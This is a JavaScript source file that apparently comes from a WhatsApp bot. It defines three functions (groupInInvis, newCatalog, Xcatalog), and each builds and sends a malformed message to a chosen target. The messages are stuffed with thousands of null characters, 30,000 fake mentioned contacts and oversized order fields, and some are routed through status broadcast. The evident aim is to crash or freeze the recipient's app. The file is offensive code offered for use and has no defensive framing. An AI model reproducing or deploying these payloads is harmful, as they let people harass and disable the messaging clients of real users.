async function groupInInvis(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                groupInviteMessage: {
                    groupJid: "X",
                    inviteCode: "X",
                    inviteExpiration: "X",
                    groupName: "\u0000".repeat(9999),
                    caption: "\u0000".repeat(9999),
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function newCatalog(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                orderMessage: {
                    orderId: "92828",
                    thumbnail: null,
                    itemCount: 9999999999999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "I AM KYZEN",
                    orderTitle: "KENALIN NIEH KING KYZEN",
                    sellerJid: m.chat,
                    token: "8282882828==",
                    totalAmount1000: "828828292727372728829",
                    totalCurrencyCode: "IDR",
                    messageVersion: 1,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function Xcatalog(target) {
    sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                orderMessage: {
                    orderId: "82737288282",
                    thumbnail: null,
                    itemCount: 99999999999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "\u0000".repeat(999),
                    orderTitle: "\u0000",
                    sellerJid: m.chat,
                    token: "8282882828==",
                    totalAmount1000: "Lezz DcodeR",
                    totalCurrencyCode: "IDR",
                    messageVersion: 1,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    }, {
        messageId: Date(),
        participant: {
            jid: target
        }
    })
}